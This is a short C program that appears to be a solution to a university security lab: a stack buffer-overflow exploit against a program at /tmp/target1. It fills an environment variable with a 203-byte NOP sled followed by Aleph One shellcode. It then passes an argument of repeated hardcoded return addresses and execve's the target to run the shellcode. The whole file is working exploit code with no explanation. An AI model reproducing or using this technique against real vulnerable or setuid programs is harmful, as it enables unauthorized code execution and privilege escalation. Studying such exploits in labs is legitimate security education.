#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"

int main(void)
{
  char *args[3]; 
  char *env[1];
  
  args[0] = TARGET;

  char rt_arr[12] = "";
  for (int i=0; i <3 ; i++){
        strcat(rt_arr, "\xd4\xfe\xff\xbf");
  }

  int sizeOfNoOp = 203;
  int sizeOfShell =  sizeof(shellcodeAlephOne) / sizeof(shellcodeAlephOne[0]);
  int n = sizeOfNoOp + sizeOfShell;
  char a[n];

  memset(a, '\x90', sizeOfNoOp*sizeof(char));

  memcpy(a+sizeOfNoOp, shellcodeAlephOne, sizeOfShell*sizeof(char));

  args[1] = rt_arr; 
  args[2] = NULL;
  
  env[0] = a;
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}


